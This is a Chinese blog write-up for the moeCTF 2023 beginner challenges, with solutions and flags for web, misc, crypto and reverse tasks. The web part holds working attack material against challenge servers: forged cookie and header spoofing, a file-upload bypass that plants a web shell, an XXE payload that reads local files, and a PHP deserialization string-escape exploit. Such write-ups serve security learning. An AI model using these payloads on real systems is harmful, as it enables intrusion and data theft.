---
title: moeCTF 2023 
description: web&misc wp
tags:
  - CTF
  - MISC
  - WEB
categories:
  - write up
cover: 'https://tuchuang.voooe.cn/images/2024/03/19/ea5a684083a94b068702a9eaf0694f87.webp'
abbrlink: moeCTF2023[2]
date: 2024-03-08 8:54:00
swiper_index: 2
---
## web

### http

http 认证绕过



![](https://s2.loli.net/2024/03/07/YgWQ4tbinMBTz1e.png)

**按照要求完成五个任务即可
Payload:
GET:UwU=u
POST:Luv=u
cookie:character=admin
x-forwarded-for:127.0.0.1
User-Agent: MoeBrowser
除Post外其余都得在Upgrade上面**

![](https://s2.loli.net/2024/03/07/1ZvxywaKkHuVYsN.png)

**moectf{basic_http_knowledge_I-MHSmMgztyYeW4SgAbRP4Fyu0Qx13Or}**

### web 入门指北

hex base64



![](https://s2.loli.net/2024/03/07/urbixDJzCAcHwsp.png)

先hex再base64

![](https://s2.loli.net/2024/03/07/Jh7tRx3wzMaViYA.png)

![](https://s2.loli.net/2024/03/07/LQwOAH6nmtd2IMv.png)

**moectf{w3lCome_To_moeCTF_W2b_challengE!!}**

### 彼岸的 flag

源码泄露



![](https://s2.loli.net/2024/03/07/pcXbdqvyxJm1g6o.png)

**一开始以为是啥，原来就是源码泄露
在管理员撤回的信息这里有flag的注释**

![](https://s2.loli.net/2024/03/07/ZN1nl564W7DyfYo.png)

**moectf{find_comments_9qv7ywbgbwCasdsfanngjHxGfgQVUKIw}**

### cookie

伪造 token



题目有附件

![](https://s2.loli.net/2024/03/07/yMXczOQrwAW34Fe.png)

按照方法先注册并且登录后访问/flag
**头：POST /register **
![](https://s2.loli.net/2024/03/07/AQR18OnWkxaYZtp.png)

显示用户已存在，我们使用自己的账号

![](https://s2.loli.net/2024/03/07/Z9rguwGd2IqkDOp.png)

然后登录

![](https://s2.loli.net/2024/03/07/XkoV7uz9sC3xrLS.png)

这个是 base64 加密的

解密为：{"username": "nanian", "password": "123456", "role": "user"}

放包后手动跳转到/flag

![](https://s2.loli.net/2024/03/07/VsnZ3g1Jr8wvte9.png)

flag{sorry_but_you_are_not_admin}

这个假 flag 提示了我们 role 可能要改成 admin（毕竟只有这个是新出来的东西）

{"username": "nanian", "password": "123456", "role": "admin"} base64 encode

![](https://s2.loli.net/2024/03/07/FnKAmPOaeBMcCrx.png)

放入浏览器的 cookie 的 token 里就行

再次访问/flag

![](https://s2.loli.net/2024/03/07/qyXTsH5eRwCzaFO.png)

**moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}**

 

###   gas!gas!gas!

   web 脚本



![](https://s2.loli.net/2024/03/07/jLgrm8qx5iflzAC.png)

**开始游戏会给出题目，然后对应题目选择正确的选项答案即可，关键在于有时间限制，所以需要编写脚本**

```python
import requests
from bs4 import BeautifulSoup
url='http://localhost:11499/'  #URL
session=requests.Session()
fx = 0
sd = 0
data={"driver":"aaa","steering_control":fx,"throttle":sd}
re=session.post(url=url,data=data)
for i in range(7):
    if '向左' in re.text:
      fx=1
    if '向右' in re.text:
      fx=-1
    if '弯道直行' in re.text:
      fx=0
    if '抓地力太小了' in re.text:
      sd=0
    if '抓地力太大了' in re.text:
      sd=2
    if '保持这个速度' in re.text:
      sd=1
    soup = BeautifulSoup(re.content, "html.parser")
    info_div = soup.find("div", {"id": "info"})
    print(info_div.text)
    data={"driver":"aaa","steering_control":fx,"throttle":sd}
    re=session.post(url=url,data=data)
    print(data)
    #来自紫竹编写的脚本~
```

![](https://s2.loli.net/2024/03/07/kCNA6QDetFR57Sq.png)

**moectf{Beautiful_Drifting!!_nUhVFFm2dbVI7EU7NC0_F4dDz-n6jjQ7}**

### moe 图床

文件上传  双后缀绕过 源码泄露



![](https://s2.loli.net/2024/03/07/grleyPDBakRwn2t.png)

**先正常上传一个文件**

![](https://s2.loli.net/2024/03/07/D3Enr926qxeA4Tu.png)

![](https://s2.loli.net/2024/03/07/R6NvgJcDMOdPwlf.png)

**发现调用了 upload.php，访问一下**

![](https://s2.loli.net/2024/03/07/H7CNgSXYbjEeKMv.png)

**源码泄露，抓住重点位置**

![](https://s2.loli.net/2024/03/07/rv8I3eZ5su6Gjfb.png)

比如我上传 muma.png.php 的话

explode()：把它们分成 muma   png   php 三段

然后 count 计数为 3>2 进入 if 内，然后让 segment=第二个位置也就是 png，再进第二个 if 里判断是否为 png

![](https://s2.loli.net/2024/03/07/KwH5qfRLDdkXy13.png)

**还要注意文件大小和类型。**

![](https://s2.loli.net/2024/03/07/gJ8shH4VfEQ1jS7.png)

**这里上传一个正常图片，然后改文件名和内容即可**

**蚁剑连接 key 为 1，在根目录找到 flag**

![](https://s2.loli.net/2024/03/07/JxABm6nqFQTjOUP.png)

**moectf{hmmm_improper_filter_G_x2kN18o5IQp_fuYySgbw6IUVvvU_Sm}**

### 了解你的座驾

xxe



![](https://s2.loli.net/2024/03/07/4kVsdNJYDpqEKGL.png)

提示 flag 在根目录中，抓包以下

![](https://s2.loli.net/2024/03/07/iWZ3EApPLjVfR6U.png)

xxe 还没学，关键点在下图

![](https://s2.loli.net/2024/03/07/lOKENPSBwLJnQgj.png)

直接套 m 神脚本

```python
import requests


headers = {
    'Host': 'localhost:52776',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------15719226131077920622631907538',
    'Origin': 'null',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
}

data = '''-----------------------------15719226131077920622631907538
Content-Disposition: form-data; name="xml_content"
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a[
    <!ENTITY b SYSTEM "file:///flag" >
]>
<xml><name>&b;</name></xml>

-----------------------------15719226131077920622631907538--
'''

response = requests.post('xxx网址位置xxx', headers=headers, data=data)   #URL

print(response.text)
```

![](https://s2.loli.net/2024/03/07/RMuGlLpY38UoWNq.png)

**moectf{Which_one_You've_Chosen?0n8i1NDyjS2SD5yAUtpdBqqvH8vXFeSu}**

### 大海捞针

URL 爆破



![](https://s2.loli.net/2024/03/07/V62NBRZhjKSOnJv.png)

按照要求先进/?id=1 看看

![](https://s2.loli.net/2024/03/07/E4K6unDiTmJRfqY.png)

跟彼岸的 flag 一样属于源码泄露，只不过这次要爆破从 1-1000 的 URL，只有一个里面有 flag

**BP抓包后到Intruder加变量，再加一个1-1000的字典然后爆破即可**

![](https://s2.loli.net/2024/03/07/vMPq4ARL58ihUKG.png)

```python
desktop_path = "xxx"  # 替换为您的路径

with open(f"{desktop_path}/number_dictionary.txt", 'w') as file:
    for number in range(1, 1001):
        file.write(str(number) + '\n')
#数字字典脚本
```

![](https://s2.loli.net/2024/03/07/4ChklfrMBZ2yPdt.png)

![](https://s2.loli.net/2024/03/07/jbVulq2ewCL4aK7.png)

**找到一个不同长度的进去搜索moectf即可得到flag**
**还可以使用py脚本遍历网址查看html找moectf关键词然后输出其注释内容**

![](https://s2.loli.net/2024/03/07/H4uvgIXMjVbomFn.png)

> 来自 chatgpt 写的脚本

```python
import requests
from bs4 import BeautifulSoup, Comment
import time


def check_for_moectf(comment):
    return "moectf" in comment


def main():
    base_url = "https://example.com/?id="  #添加自己的URL
    found_moectf = False

    for id_num in range(1, 1001):
        url = base_url + str(id_num)
        response = requests.get(url)

        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            comments = soup.find_all(string=lambda text: isinstance(text, Comment))

            for index, comment in enumerate(comments, start=1):
                print(f"Comment {index} at {url} (ID: {id_num}): {comment}")

                if not found_moectf and check_for_moectf(comment):
                    print(f"Found 'moectf' in comment at {url} (ID: {id_num}): {comment}")
                    found_moectf = True
                    break  # 找到后立即结束当前页面的注释检查
        else:
            print(f"Failed to fetch the webpage at {url}.")

        # 添加时间间隔，模拟正常的访问速度
        time.sleep(1)  # 在每个请求之后等待1秒

        if found_moectf:
            break  # 找到 moectf 后立即结束整体检查


if __name__ == "__main__":
    main()
```

**moectf{script_helps_QKmIks5AEfKv4t-VhXQvlIGufYuK5bLp}**

###   meo 图床

   file_get_contents()  php 弱类型比较



![](https://s2.loli.net/2024/03/07/sPjDJKLeF8ulYbS.png)

正常流程上传图片之后

![](https://s2.loli.net/2024/03/07/ZwBgreHDSq2Yy3L.png)

**经过 bp 抓包发现 name 参数里的值为文件名，改成 flag 看回显**

![](https://s2.loli.net/2024/03/07/CUqxgEFWm3QnTzu.png)

![](https://s2.loli.net/2024/03/07/bI4Q1vGXxShqJDe.png)

**尝试../，最后在根目录处得到提示**

![](https://s2.loli.net/2024/03/07/GSzMH6iYAaqu4tx.png)

**直接访问 URL/Fl3g_n0t_Here_dont_peek!!!!!.php**

![](bYGmjoxiRVx)

**简单弱类型md5比较，直接数组绕过
?param1[]=1&param2[]=2**

![](https://s2.loli.net/2024/03/07/rvDulM1423YCp5R.png)

**moectf{oops_file_get_contents_controllable_Vr83kqkQn07GeQ_FSCvDh_-KAXgF7mLP}**

### 夺命十三枪

反序列化漏洞 字符串逃逸



![](https://s2.loli.net/2024/03/07/eA4WuVPmNLdX9bi.png)

Hanxin.exe.php 里也有源文件

![](https://s2.loli.net/2024/03/07/K1Cq3dcmEp2waDx.png)

**从下面读吧，flag是环境变量，只要满足让Spear_Owner=MaoLei就可以得到flag
Spear_Owner是类Omg_It_Is_So_Cool_Bring_Me_My_Flag的变量
再看第一张图的$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant); 
$Nwe_visitor调用了此类创建实例，然后被反序列化后赋值给变量before
before再运行了Make_a_Move($move)方法，也就是第二张图十三枪那里,其作用是对符合条件的字符串进行替换
结束此方法后的值给到after，并对其进行序列化，接着运行Omg_It_Is_So_Cool_Bring_Me_My_Flag类里的判断，如果此时Spear——Owner的值是MaoLei的话就可以获得flag了**

这里在十三枪替换处存在一个字符串逃逸的漏洞，具体原理参考[资料](https://blog.csdn.net/qq_43431158/article/details/108210822)

我这里用第一枪，替换一个逃逸一个字符

关键 payload：`";s:11:"Spear_Owner";s:6:"MaoLei";}` 占 35 格

那就给 35 个第一枪上去 `di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}`

这里总共 420 格，最后补其句式即可

**EXP：
GET:URL/?chant=o:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flags":2{s:5:"Chant"s:420:"di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}**

![](https://s2.loli.net/2024/03/07/hLwFTW6SYnQmAU1.png)

> 这里还可以用第七枪，第七枪一次逃逸 5 格
<br>

## misc

###    misc 入门指北

   base64



![](https://s2.loli.net/2024/03/07/lgX2kOVTrIesMS9.png)

**base64解码**

![](https://s2.loli.net/2024/03/07/V32EnUoTMLHvmZP.png)

**moectf{h@v3_fun_@t_m15c_!}**

### 打不开的图片 1

jpg 文件头缺失，exif 隐写，hex



**拿到空文件去 010 看看**

![](https://s2.loli.net/2024/03/07/JkOfbMltdzyZrHm.png)

![](https://s2.loli.net/2024/03/08/ZXg5tv13ydFBkuD.png)

尾巴 FF D9 符合 jpg，考查文件头缺失

补充 jpg 文件头即可

![](https://s2.loli.net/2024/03/08/mlOeSJrGjwCYhHL.png)

![](https://s2.loli.net/2024/03/08/J8k6SGgaEU7fX34.png)

保存后，改后缀为.jpg 后打开

![](https://s2.loli.net/2024/03/07/Na8ws5WZCtemvd2.png)

![](https://s2.loli.net/2024/03/08/aX7xbN1fCvFOAin.png)

**没有东西，才看到 ascii 里有 exif，考虑属性藏了东西**

![](https://s2.loli.net/2024/03/08/ViPvytK4SAw23YJ.png)

**藏了 hex，解码**

![](https://s2.loli.net/2024/03/07/WO2Xk6oibzVRax5.png)

**moectf{XDU_i5_v3ry_6e@u2ifu1}**

### 打不开的图片 2

png 文件头尾



![](https://s2.loli.net/2024/03/07/M14avGSqhmByEYe.png)

**根据提示猜测文件头尾不相同**

![](https://s2.loli.net/2024/03/07/iprHoFQ7XKMcEyJ.png)

![](https://s2.loli.net/2024/03/08/TPizcvglEqFSXps.png)

改头为 png 格式即可

![](https://s2.loli.net/2024/03/07/KypDFVbLUIgn78v.png)

![](https://s2.loli.net/2024/03/07/629yAYpGxNFwOcK.png)

刚好改前面四个就行

![](https://s2.loli.net/2024/03/08/FYUd7LCecWHjQkn.png)

**moectf{D0_yOu_1ik3_Bo7@ck_?}**

### 狗子(1) 普通的猫

010editor



**题目给的一个 wav 文件，但 flag 实际就在 ascii 最底下**

![](https://s2.loli.net/2024/03/07/WUQpRZrE6mOfJoV.png)

**moectf{eeeez_f1ag_as_A_G1ft!}**

###    building_near_lake

   社工



> 直说过程

**百度识图，社到地址为****厦门大学翔安校区图书馆**

**然后百度地图拾取器，定位直接提取经纬度**

**设备信息在 exif 里面有型号，复制到网上一搜就是红米 k60，再搜其发布时间即可**

**moectf{P0sT_Y0uR_Ph0T0_wiTh_0Riginal_File_is_n0T_a_g00d_idea_YlJf!M3rux}**

### 尊嘟假嘟？

尊嘟假嘟加密，blowfish 加密，base58(区块链地址加密方式)，



先拿到 txt 文本

![](https://s2.loli.net/2024/03/07/Z51VGSjry9E3YKO.png)

在 github 里搜索到对应加密    [GitHub - SnailSword/zdjd: 人类语言与尊嘟语的转换器。](https://github.com/SnailSword/zdjd)

![](https://s2.loli.net/2024/03/07/hgLKuZeUCtRHNvl.png)

在线解密即可

![](https://s2.loli.net/2024/03/07/MCEU5fw9mVsvrd6.png)

**密码已经给出
key：字符串zundujiadu?哈希加密后b60开头哈希值末尾8个字节
iv（偏移量）：字符串dududu?哈希加密后272开头哈希值末尾8个字节
hint1：比特币地址的加密方式
hint2：此次加密的名称为“bl***sh”**

[哈希加密算法 MD5|SHA-1|SHA-2|SHA-256|SHA-512|SHA-3|RIPEMD-160 哈希 Hash 加密算法 iP138 在线工具](https://tool.ip138.com/hash/)

![](https://s2.loli.net/2024/03/08/AkcVIhHD4KNe5uy.png)

![](https://s2.loli.net/2024/03/07/AXaQfmkOZtirco8.png)

**比特币区块链（三） | 比特币地址**

![](https://s2.loli.net/2024/03/07/2OSrMuo1LjgfIib.png)

**cyberchef 直接搜 bl 找对应的就行**

![](https://s2.loli.net/2024/03/07/Mr6LaP2e4KWDctS.png)

总结如下

![](https://s2.loli.net/2024/03/08/1xtP6dMSnDefjJu.png)

**赛博厨子解密**

![](https://s2.loli.net/2024/03/08/ADiGydP3HqmQET8.png)

**moectf{wow_you_aRe_the_masteR_of_Zundujiadu_92WPIBung92WPIBung9?WPIBung}**

### 烫烫烫

UTF-7  AES



![](https://s2.loli.net/2024/03/08/5ABMdz4LOUErIui.png)

坤坤，以后做全试一遍得了，目前还不太懂这类编码...

![](https://s2.loli.net/2024/03/07/CXYEKiQlb72mIGL.png)

文本内容可以用 decode text 解决，选择 UTF-7 模式，并且 input ouput 的右下角都要选择 UTF-7

**这是你的flag：

a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262

但是flag用AES加密了，key是下面这行字的sha256（hash值的开头是b34edc782d68fda34dc23329）

所以说，codepage真的很重要啊（**

开头有了但没有后面，试试加密下后面的文本

![](https://s2.loli.net/2024/03/08/CR9TMjrxoyA6gJd.png)

给了句子的前面部分，所以这里直接把句子的 sha256 复制就行

![](https://s2.loli.net/2024/03/07/DBkPAptg2Yem6bh.png)

这里记录下各个位置的参数选择

### 狗子(2) 照片

lsb 隐写



**尝试了很多，一开始 zsteg 还不行，后来 m 神说图片太大，要改宽高变小点再试**

![](https://s2.loli.net/2024/03/08/7jhT95yXAsfle4d.png)

![](https://s2.loli.net/2024/03/07/6Ak4CVqX8FSnGwz.png)

**高度改成和宽度一样再试试**

![](https://s2.loli.net/2024/03/07/NwaiB5zRJt7Ipfg.png)

**moectf{D0ggy_H1dd3n_1n_Pho7o_With_LSB!}**

### base 乐队

base 嵌套   栅栏密码



**拿到字符串放到 cyberchef 中**

![](https://s2.loli.net/2024/03/07/ywFGurgQD2Ekodj.png)

**看到两个=但不是都在最后，考虑可能有凯撒或者栅栏或者 rot 啥的吧，直接工具梭哈一下**

![](https://s2.loli.net/2024/03/07/86zZsEtaOfmTNkR.png)

**栅栏密码，把明文再放入 cyberchef 中**

![](https://s2.loli.net/2024/03/07/3oa1HrSMDdyhslF.png)

**moectf{Th4_6@nd_1nc1ud45_F3nc4_@nd_b@s3}**

###    奇怪的压缩包

   ppt 隐写



![](https://s2.loli.net/2024/03/07/IK6cAQmSjGJCD5w.png)

![](https://s2.loli.net/2024/03/08/MTRg1XKjaqDFu9L.png)

**附件下来看到里面有 ppt，结合题目说不是压缩包，尝试改后缀.ppt**

![](https://s2.loli.net/2024/03/07/VApag8w1WZUEI9s.png)

**Ctrl+a 全选找找是否有藏起来的文字框**

**发现第二页是把字体改白色和背景混起来了**

![](https://s2.loli.net/2024/03/07/EYflCBhgHmTceA3.png)

**第三页同样方法，藏在图片后面，但 123456 是假的，注释才是 flag 内容**

![](https://s2.loli.net/2024/03/07/Q4BI6Pfpmnh1w9r.png)

**第四页同理**

![](https://s2.loli.net/2024/03/08/BFqMDRHIhof1rag.png)

**最后一页按次方法没用，但估计最后一段就在这里了，根据前面得到 flag 为****moectf{2ip_?_n0_i4**

**也可以猜到是 ppt 或者 pptx，估计一直爆破也能出**

**通过 m 神提示：还可以 ctrl+f 搜索一下**

![](https://s2.loli.net/2024/03/07/coy3IluUwY8O4WR.png)

**锁定在这个框，但是不是改文字颜色，啥都找不到，这时 m 神发了个视频**

得一直拖着它才可以看到，最后得到 flag

**moectf{2ip_?_n0_i4_pp4x!}**

### 机位查询

社工



![](https://s2.loli.net/2024/03/07/l5CchoUIGeiyZMT.png)

![](https://s2.loli.net/2024/03/07/YwugSjerdv7ARUa.png)

**第一张抓远处南京站，城市便捷，还有下面的店铺猪霸王**

**百度地图里面定位好后，切****3D****到这条路上一看，只有一栋高楼对应，jiashi**

![](https://s2.loli.net/2024/03/07/OL2so5MuvBYPjyX.png)

**第二张很明显，百度地图直接定位中山路美食街，切****3D****进门口的路口处观察**

**对面只有一个博物馆和一个高楼，博物馆太矮所以锁定百盛广场   baisheng**

![](https://s2.loli.net/2024/03/08/5iFsYPOgUdV7HQj.png)

第三张图可找死我了，这个拍摄角度非常刁钻，我抓的是时代丽都和中国人保还有 95500（太平洋保险）

定位也到了，但最后发现太平洋保险离另外两个特别远，后来才知道做法不对，这张图 exif 有经纬度

[在线查看图片经纬度_图片 Exif 信息_图片定位信息_GPS 信息 - StrErr.com](https://www.strerr.com/cn/exif.html)

![](https://s2.loli.net/2024/03/08/B6u5x2IoT8s1anN.png)

google 地图打开

![](https://s2.loli.net/2024/03/08/AzFB6svRo7Wr3Ip.png)

**试了亚朵发现不行，后来百度地图也定位到这里才发现这栋楼叫汇金苑..         huijin**

![](https://s2.loli.net/2024/03/07/iojJk5GIrZuTNmC.png)

**moectf{jiashi_baisheng_huijin}**

### 狗子(3) 寝室

压缩包套娃



> 使用压缩包脚本（来自紫竹老公写的）

```python
import zipfile
import os
import rarfile
import tarfile
import py7zr

a=9999
while a!=0:
  zipname='shell'+str(a)+'.zip'
  if(os.path.exists(zipname)):
    zfile=zipfile.ZipFile(zipname)
    zfile.extractall()
    zfile.close()
    a-=1
  rarname='shell'+str(a)+'.rar'
  if(os.path.exists(rarname)):
    rfile=rarfile.RarFile(rarname)
    rfile.extractall()
    rfile.close()
    a-=1
  tarname='shell'+str(a)+'.tar.gz'
  if(os.path.exists(tarname)):
    rfile=tarfile.open(tarname)
    rfile.extractall()
    rfile.close()
    a-=1
  zname='shell'+str(a)+'.7z'
  if(os.path.exists(zname)):
    file=py7zr.SevenZipFile(zname)
    file.extractall()
    file.close()
    a-=1
```

![](https://s2.loli.net/2024/03/07/HTJXwLzkmE9lWgr.png)

**moectf{Ca7_s133p1ng_und3r_zip_5hell5}**

### 你想要 flag 吗

知识点 ：音频 lsb 隐写  rabbit 加密



拿到音频文件查看下频谱图

![](https://s2.loli.net/2024/03/08/BEfYoP86i7UMA31.png)

**steghide**

![](https://s2.loli.net/2024/03/08/X2FouNvfnkr4xV6.png)

![](https://s2.loli.net/2024/03/07/KvDYkizV6bom123.png)

**根据文件名和编码前缀可知为 rabbit 加密**

![](https://s2.loli.net/2024/03/07/XgHKW8w2ACjJGDZ.png)

**moectf{Mu5ic_1s_v3ry_1nt23esting_!}**

###    照片冲洗

   图片分离 + 盲水印



![](https://s2.loli.net/2024/03/07/1EcwadCNuPA5OZf.png)

**题目仅给了一张图，根据题目描述猜测是两张图的盲****水印****，这里先要把图片文件分成两张图**

![](https://s2.loli.net/2024/03/07/RctwyNb1FTZjHUS.png)

010 搜索 png 文件尾发现有两个并且一个在中间一个在末尾，手工分离一下，并添加好文件头

**- PNG (png)，
文件头：89 50 4E 47 0D 0A 1A 0A
文件尾：AE 42 60 82**

![](https://s2.loli.net/2024/03/07/wEyW7QAuarGg2eD.png)

利用工具操作即可

![](https://s2.loli.net/2024/03/07/As29n4Uqej1TraJ.png)

> **注意模式和先后顺序均有讲究**

![](https://s2.loli.net/2024/03/07/tjZXKvqwlerFHdC.png)

**moectf{W0w_you_6@v3_1earn3d_blind_w@t3rma2k}**

### 狗子(4) 故乡话

mc 脑洞题  附魔台语言



![](https://s2.loli.net/2024/03/07/LHKkVC5xlr9hIiW.png)

**true 改 1，false 改 0**

![](https://s2.loli.net/2024/03/07/fcKzw15nukHyG94.png)

**眯眼睛看隐隐约约好像有东西在里面**

**把 0 改.   1 改 0 **

![](https://s2.loli.net/2024/03/07/YOsW5D2JydaiPcR.png)

**明显多了，紫竹思路是猜测附魔台的语言，果真啊牛逼**

![](https://s2.loli.net/2024/03/08/pd7q2zRwEaD95ju.png)

**对照表翻译即可**

![](https://s2.loli.net/2024/03/07/bTqgmOdE5l3pK16.png)

**moectf{dontanswer}**

### weird_package

文件 hex 码的拼接   base64  raw-inflate



![](https://s2.loli.net/2024/03/08/t6jToSyJhiZWsz5.png)

![](https://s2.loli.net/2024/03/07/mMywIAsaG9XYdfh.png)

010 打开压缩包看到很多压缩包隐写在里面

但是 binwalk 不出来，**猜测是要自己拼接**

但是 **bandizip 可以直接修复**

![](https://s2.loli.net/2024/03/08/TS1QjbYOU3EHALk.png)

![](https://s2.loli.net/2024/03/07/gnKrIRpLk73SjQC.png)

![](https://s2.loli.net/2024/03/07/l843dHy7GESeLkh.png)

打开后都是类似 base64 的玩意，按队里佬提示用 cyberchef 解密

![](https://s2.loli.net/2024/03/07/WTrKNXGdtuAqHnI.png)

八个假的，只有一个是真的 flag

![](https://s2.loli.net/2024/03/07/rvtGiowLVNSynj3.png)

## 其他

###  base_64

   逆向脚本



https://tool.lu/pyc/    pyc 在线编译，没工具的把题目的 pyc 文件放这里就行

![](https://s2.loli.net/2024/03/08/Ls1gEUJIZ5CVX9F.png)

脚本

```python
import base64
import string

str1 = "yD9oB3Inv3YAB19YynIuJnUaAGB0um0="
string1 = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/"
string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))
```

把题目给的 str1，string1，string2 都替换脚本里的运行就可以了

![](https://s2.loli.net/2024/03/08/koOmbn17Cdwjq9v.png)

**moectf{pYc_And_Base64~}**

### ccccc

c 语言编程题



![](https://s2.loli.net/2024/03/08/CwbJ63ergTEacWF.png)

学习 c 语言编程

**moectf{HAHA_C_1s_easy!}**

### Python

python 编程题



![](https://s2.loli.net/2024/03/08/QCTdR7tAg6s8ulF.png)

运行得到 flag

**moectf{Pyth0n_1z_0ur_g00d_friendz}**

### runme

cmd or powershell 运行



powershell 运行 runme.exe 即可

![](https://s2.loli.net/2024/03/08/IpVn64rWahxgCJ1.png)

**moectf{0h_y0u_can_use_cmd!!!}**

###   runme2

   kali 运行即可



先改个权限先：chmod 777 [文件]

![](https://s2.loli.net/2024/03/08/PCMofQA81VtIgnN.png)

**moectf{Run_me_in_linux!}**

### crypto 入门指北

经典 RSA



![](https://s2.loli.net/2024/03/08/ZKdslGuB38x56Rk.png)

运行得到 flag

**moectf{weLCome_To_moeCTf_CRypTo_And_enjoy_THis_gAme!_THis_is_yoUR_fLAg!}**

### ezrot

rot47 密码

**题目给的字符串结合提示一个一个试rot即可**

![](https://s2.loli.net/2024/03/08/Bkg79Fsn6twILOe.png)

**moectf{rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_}**

### 可可的新围墙

栅栏密码（w 型）



[栅栏在线](http://www.metools.info/code/fence154.html)

![](https://s2.loli.net/2024/03/08/DU59WR8axu12EdK.png)

**moectf{F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj}**

###    皇帝的新密码

   凯撒密码



7 位

![](https://s2.loli.net/2024/03/08/E32FrNSt4xOkW7g.png)

**moectf{CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To}**

### 不是"皇帝的新密码"

维吉尼亚密码



> 前面皇帝的新密码指的是凯撒，而现在又要扯到他，指明不是凯撒，那很有可能是其的延伸维吉尼亚

先拿 moectf 试下

![](https://s2.loli.net/2024/03/08/weOsTEhARKLxoti.png)

**猜测goodjob为key**

![](https://s2.loli.net/2024/03/08/V7WzY4wU2c3s9mB.png)

**moectf{vIgENErE_CIphEr_Is_a_lIttlE_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz}**

### Reverse 入门指北

IDA 反编译



exe 文件放入 ida64 中

![](https://s2.loli.net/2024/03/08/5ACDIZu237WaRqd.png)

**找到main函数F5反编译成c语言即可**

**moectf{F1rst_St3p_1s_D0ne}**

### test_nc

linux 基础命令



一开始给 localhost（127.0.0.1）地址的话虚拟机 nc 不了

听 m 神，给了个 0.0.0.0 的地址，然后先 `ip addr | grep 192.` 查询了自己的 ip

然后 nc 自己的 ip 端口 就可以登了

![](https://s2.loli.net/2024/03/08/1kQY6Z4ruSygdOf.png)

ls 看到有 gift，试试 cat 一下

![](https://s2.loli.net/2024/03/08/WKDMLbZwV6JNTFp.png)

> 我的 linux 语言基础太弱了捏

![](https://s2.loli.net/2024/03/08/u5n1wtAymLrVHPR.png)

**Ls -a查下所有文件**

![](https://s2.loli.net/2024/03/08/52LUGIbqaVzcjBl.png)

看到隐藏的 flag 了，再 cat 就行

**moectf{Dsa-vTzMEdclL0G6gDkH4NXfAcvGsR_g}**

###    ai 入门指北

   Torch 安装命令



**moectf{install_torch_torchvision_torchaudio}**

### Xor

异或运算



拿到题目找到 main 函数 F5 反编译

![](https://s2.loli.net/2024/03/08/7VWfacCL9tn5ARl.png)

解读代码，要求 enc[]=input[]异或 0x39，而 input 就是 flag 的内容

双击 enc 找到其位置

![](https://s2.loli.net/2024/03/08/rFw3hk7IfcEeS2U.png)

shift+e 提取出来

![](https://s2.loli.net/2024/03/08/WVkMETg5qUaAv2N.png)

这是 enc[]数组里的值，我们只需要把原代码逆过来求用户应该输入的 flag 值即可

```c
#include <stdio.h>

int main() {
    unsigned char enc[] = {
        0x54, 0x56, 0x5C, 0x5A, 0x4D, 0x5F, 0x42, 0x60,
        0x56, 0x4C, 0x66, 0x52, 0x57, 0x09, 0x4E, 0x66,
        0x51, 0x09, 0x4E, 0x66, 0x4D, 0x09, 0x66, 0x61,
        0x09, 0x6B, 0x18, 0x44
    };
    
    unsigned char input[28];
    
    for (int i = 0; i < 28; ++i) {
        input[i] = (enc[i] ^ 0x39);
        printf("0x%02X", input[i]);
        if (i < 27) {
            printf(", ");
        }
    }

    return 0;
}
```

![](https://s2.loli.net/2024/03/08/a4q2u1QegcL5dfE.png)

![](https://s2.loli.net/2024/03/08/mo6KqEuWaAZyXMN.png)

**moectf{You_kn0w_h0w_t0_X0R!}**

### 喵言喵语

摩斯密码



![](https://s2.loli.net/2024/03/08/mSLWVApziKXjn2Z.png)
